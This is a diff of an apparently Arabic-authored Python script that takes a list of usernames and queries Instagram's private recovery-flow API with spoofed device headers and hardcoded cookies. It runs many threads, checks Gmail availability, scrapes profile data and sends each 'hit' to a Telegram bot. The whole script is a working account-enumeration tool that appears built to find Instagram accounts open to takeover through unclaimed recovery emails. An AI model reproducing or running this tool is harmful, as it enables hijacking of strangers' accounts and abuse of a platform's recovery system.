@@ -18,8 +18,8 @@ S = '\033[2;36m'#سمائي
 G = '\033[1;34m' #ازرق فاتح
 HH='\033[1;34m' #ازرق فاتح
 M = '\x1b[1;37m'#ابیض
-iid=input(F+'Id  : '+S)
-tok =input(F+'Token : '+S)
+iid=input(F+'EntEr Id '+X)
+tok=input(F+'EntEr Token  '+X)
 os.system('clear')
 ge,be,gi,bi,block=0,0,0,0,0
 try:
@@ -29,39 +29,6 @@ try:
 except :
 	print('Id None')
 	exit()
-def rest(email):
-    rre=email.split('@')[0]
-    uh='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
-    hr={
-    'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
-    'X-Pigeon-Rawclienttime':'1707104597.347',
-    'X-IG-Connection-Speed':'-1kbps',
-    'X-IG-Bandwidth-Speed-KBPS':'-1.000',
-    'X-IG-Bandwidth-TotalBytes-B':'0',
-    'X-IG-Bandwidth-TotalTime-MS':'0',
-    'X-IG-VP9-Capable':'false',
-    'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
-    'X-IG-Connection-Type':'WIFI',
-    'X-IG-Capabilities':'3brTvw==',
-    'X-IG-App-ID':'567067343352427',
-    'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
-    'Accept-Language':'ar-IQ, en-US',
-    'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
-    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
-    'Accept-Encoding':'gzip, deflate',
-    'Host':'i.instagram.com',
-    'X-FB-HTTP-Engine':'Liger',
-    'Connection':'keep-alive',
-    'Content-Length':'364',
-    }
-    dah={
-    'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{rre}''"}',
-
-    'ig_sig_key_version':'4',
-    }
-    k=requests.post(uh,headers=hr,data=dah).text
-    try:return  k.split('email":"')[1].split('","status":"ok"}')[0]
-    except:return False
 def date(Id):
  try:
   if int(Id) >1 and int(Id)<1279000:
@@ -88,10 +55,60 @@ def date(Id):
    return "2020-2023"
  except:
  	return False 	
+def hsp(email,rest):
+	try:
+	   	kk=email.split('@')[0]
+	   	kk2=rest.split('@')[0]
+	   	kk3=rest.split('@')[1]
+	   	kk4=email.split('@')[1]
+	   	hso1=kk
+	   	hso2=kk2
+	   	num1=hso1[0]
+	   	num2=hso1[-1]
+	   	num3=hso2[0]
+	   	num4=hso2[-1]
+	   	if num1==num3 and num2==num4 and kk3==kk4:
+	   		return 'معلومات صح ✈️'
+	   	else:
+	   		return 'معلومات خطأ 😜'
+	except Exception as e:
+		return 'غير معلوم 🤐'
 def info(email):
-    
-    res=rest(email)
+    stp=email+'@gmail.com'
+    #print(stp)
     username=email.split("@")[0]
+    uh='https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
+    hr={
+    'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
+    'X-Pigeon-Rawclienttime':'1707104597.347',
+    'X-IG-Connection-Speed':'-1kbps',
+    'X-IG-Bandwidth-Speed-KBPS':'-1.000',
+    'X-IG-Bandwidth-TotalBytes-B':'0',
+    'X-IG-Bandwidth-TotalTime-MS':'0',
+    'X-IG-VP9-Capable':'false',
+    'X-Bloks-Version-Id':'009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
+    'X-IG-Connection-Type':'WIFI',
+    'X-IG-Capabilities':'3brTvw==',
+    'X-IG-App-ID':'567067343352427',
+    'User-Agent':'Instagram 100.0.0.17.129 Android (30/11; 320dpi; 720x1448; realme; RMX3231; RMX3231; RMX3231; ar_IQ; 161478664)',
+    'Accept-Language':'ar-IQ, en-US',
+    'Cookie':'mid=Zbu4xQABAAE0k2Ok6rVxXpTD8PFQ; csrftoken=dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK',
+    'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+    'Accept-Encoding':'gzip, deflate',
+    'Host':'i.instagram.com',
+    'X-FB-HTTP-Engine':'Liger',
+    'Connection':'keep-alive',
+    'Content-Length':'364',
+    }
+    dah={
+    'signed_body':'ef02f559b04e8d7cbe15fb8cf18e2b48fb686dafd056b7c9298c08f3e2007d43.{"_csrftoken":"dG4dEIkWvAWpIj1B2M2mutWtdO1LiPCK","adid":"5e7df201-a1ff-45ec-8107-31b10944e25c","guid":"b0382b46-1663-43a7-ba90-3949c43fd808","device_id":"android-71a5d65f74b8fcbc","query":"'f'{username}''"}',
+
+    'ig_sig_key_version':'4',
+    }
+    k=requests.post(uh,headers=hr,data=dah).text
+    try:rest= k.split('email":"')[1].split('","status":"ok"}')[0]
+    except:rest= False
+    
     try:
         url = f"https://i.instagram.com/api/v1/users/web_profile_info/?username={username}"
         headers = {
@@ -137,7 +154,7 @@ def info(email):
         ff=f'''
 ¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
 𝙶𝙼𝙰𝙸𝙻 : {email}
-𝚁𝙴𝚂𝚃𝙴𝚃: {res}
+𝚁𝙴𝚂𝚃𝙴𝚃: {hsp(stp,rest)}
 𝙽𝙰𝙼𝙴 : {full_name}
 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂:{followers}
 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶: {following}
@@ -151,20 +168,23 @@ Py- @ii33cc
         
         '''
         requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
+        #print(ff)
     
 
     except requests.exceptions.RequestException as e:
+        #print(e)
         ff=f'''
 ¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸ 
 𝙶𝙼𝙰𝙸𝙻 : {email}
-𝚁𝙴𝚂𝚃𝙴𝚃: {res}
+𝚁𝙴𝚂𝚃𝙴𝚃: {hsp(stp,rest)}
 𝚒𝚗𝚏𝚘 : https://www.instagram.com/{username}?igsh=bXRmcXUyMXVxM3Mx
 ¸¸.•´¯•.¸ 𝑯𝑺𝑶¸.•´¯•.¸¸
 Py- @ii33cc        
         '''
         requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={iid}&text=" + str(ff))
+       # print(ff)
 def Gmail(email):
-    global ge,be,gi,bi
+    global ge,be,gi,bi,block
     if '@' in email:email=email.split('@')[0]
     if '..' in email or '_' in email or len(email) < 5 or len(email) > 30:
         return False
@@ -289,14 +309,17 @@ def Gmail(email):
         headers=headers,
         data=data,
     ).text
-
+  #  print(response)
     if "password"in response:
-        return True
+        ge+=1
+        info(email)
+        sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | False : {M}{be}{X} | Not  : {M}{bi}{C} | block : {M}{block}'''),sys.stdout.flush()
     else:
-    	return False
+    	be+=1
+    	sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | False : {M}{be}{X} | Not  : {M}{bi}{C} | block : {M}{block}'''),sys.stdout.flush()
     	
 def insta2(email):
-    global ge,be,gi,bi
+    global ge,be,gi,bi,block
     headers = {
         'X-Pigeon-Session-Id':'2b712457-ffad-4dba-9241-29ea2f472ac5',
         'X-Pigeon-Rawclienttime':'1707104597.347',
@@ -326,56 +349,38 @@ def insta2(email):
     }	
     try:
         res = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
+    #    print(res)
         if ('"can_recover_with_code"')in res:
-        	return 'True_in'
+        	gi+=1
+        	Gmail(email)
+        	sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | False : {M}{be}{X} | Not  : {M}{bi}{C} | block : {M}{block}'''),sys.stdout.flush()
         elif ('"spam":true')in res:
-        	return 'block_ip'
+        	block+=1
+        	sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | False : {M}{be}{X} | Not  : {M}{bi}{C} | block : {M}{block}'''),sys.stdout.flush()
+        	use=email.split('@')[0]
+        	with open('username_block.txt','a')as hh:
+        		hh.write(use+'\n')
         else:
-        	return 'bad_in'
+        	bi+=1
+        	sys.stdout.write(f'''\r{F}Hits : {M}{ge}{Z} | False : {M}{be}{X} | Not  : {M}{bi}{C} | block : {M}{block}'''),sys.stdout.flush()
     except Exception as e:""
    # print(re)
     
-def home(user):
-	global ge,be,gi,bi,block
-	email=user
-	hso=insta2(email)
-	if hso=='True_in':
-		gi+=1
-		hso_gm=Gmail(email)
-		if hso_gm==True:
-			info(email)
-			ge+=1
-		elif hso_gm==False:
-			be+=1
-	elif hso=='block_ip':
-			block+=1
-			use=email.split('@')[0]
-			with open('username_block.txt','a')as hh:
-				hh.write(use+'\n')
-	elif hso=='bad_in':
-			bi+=1
-	os.system('clear')		
-	sys.stdout.write(f'''\r
-{X}═══════════════════	
-{M}ʜɪᴛs : {F}{ge}
-{M}ʙᴀᴅ ʜɪᴛs : {Z}{bi}
-{M}ɴᴏᴛ ʜɪᴛs : {C}{be}
-{M}ʙʟᴏᴄᴋ ɪᴘ : {S}{block}
-{M}ᴇᴍᴀɪʟ:  {A}{email}	
-{X}═══════════════════
-	''')
+
+	
 def admin_gm(name):
     try:
          file = open(name,'r').read().splitlines()
     except:
         os.system('clear' if os.name == 'posix' else 'cls')
         print("السته غير موجوده  ! "	)
-    with ThreadPoolExecutor(max_workers=40)as executor:
-        futures=[executor.submit(home,user+"@gmail.com")for user in file]
+    with ThreadPoolExecutor(max_workers=20)as executor:
+        futures=[executor.submit(insta2,user+"@gmail.com")for user in file]
         for future in futures:
             future.result()
 name=input('File Name : ')
 os.system('clear')
 admin_gm(name)
 #حقوق المطور حسو @hsopyt
-            
+
+	
